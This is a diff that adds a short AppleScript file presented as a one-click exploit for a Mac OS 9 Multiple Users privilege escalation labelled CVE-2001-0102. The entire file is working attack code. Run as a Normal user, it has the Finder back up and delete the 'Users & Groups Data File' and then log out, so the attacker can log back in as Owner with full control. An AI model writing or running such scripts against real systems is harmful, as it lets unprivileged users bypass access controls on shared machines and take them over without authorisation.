@@ -1,0 +1,24 @@
+-- Mac OS 9 Multiple Users Privilege Escalation (CVE-2001-0102)
+-- One-click Owner mode. Run as a Normal user.
+
+tell application "Finder"
+    -- Find the critical file
+    set sysFolder to path to system folder
+    set prefsFolder to folder "Preferences" of sysFolder
+    set dataFile to file "Users & Groups Data File" of prefsFolder
+    
+    if exists dataFile then
+        -- Backup it first (optional but smart for demo)
+        duplicate dataFile to desktop with replacing
+        -- Delete the original (moves to Trash, which is fine)
+        delete dataFile
+        
+        display dialog "Users & Groups Data File removed!" & return & return & "Logging out now. Log back in as \"Owner\" for full control." buttons {"OK"} default button 1 with icon caution
+        
+        -- Auto log out (triggers the magic on next login)
+        log out
+        
+    else
+        display dialog "No Users & Groups Data File found." & return & return & "Multiple Users might not be enabled, or you're already Owner." buttons {"OK"} default button 1 with icon stop
+    end if
+end tell
